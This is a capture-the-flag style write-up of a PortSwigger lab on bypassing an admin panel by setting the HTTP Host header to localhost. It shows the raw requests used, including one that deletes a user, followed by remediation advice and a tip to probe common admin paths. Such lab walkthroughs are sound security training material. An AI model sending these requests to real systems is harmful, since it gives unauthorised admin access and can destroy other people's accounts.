# Lab: Host Header Authentication Bypass

**Category:** HTTP Host Header Attacks
**Difficulty:** Apprentice
**Lab link:** [Host header authentication bypass](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-authentication-bypass)

## Overview

The application has an admin panel at `/admin` that is restricted to "local" users. It determines locality by checking the `Host` header — if the value is `localhost`, the app treats the request as internal and grants access. No authentication or session is required.

## Key Concepts

- **Host header trust:** The app uses the `Host` header as a signal for internal vs external requests — an attacker-controlled header that can be freely modified.
- **Localhost bypass:** Setting `Host: localhost` tricks the app into thinking the request originates from the server itself, granting admin privileges.
- **Repeater requirement:** Every request to `/admin` must carry `Host: localhost` — the browser always sends the real hostname.

## Solution

### Step 1 — Confirm the restriction

```
GET /admin HTTP/1.1
Host: <lab-id>.web-security-academy.net
```
Returns 401 or a "admin interface only available to local users" message.

### Step 2 — Bypass with localhost

Send to Repeater, change the Host header:

```
GET /admin HTTP/1.1
Host: localhost
```

The admin panel is now accessible. The response contains a link to delete users.

### Step 3 — Delete carlos

```
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
```

Lab solved.

## Remediation

- Never use the `Host` header to make security decisions — it is fully attacker-controlled.
- Use server-side network controls (firewall rules, middleware IP checks) to restrict admin interfaces to internal IPs.
- Apply proper authentication to admin endpoints regardless of origin.

## Key Takeaways

- The `Host` header is not a trust boundary — any client can set it to any value.
- Admin panels that rely on hostname-based access control are trivially bypassable.
- Always test `/admin`, `/administrator`, `/internal` etc. with `Host: localhost` and `Host: 127.0.0.1`.
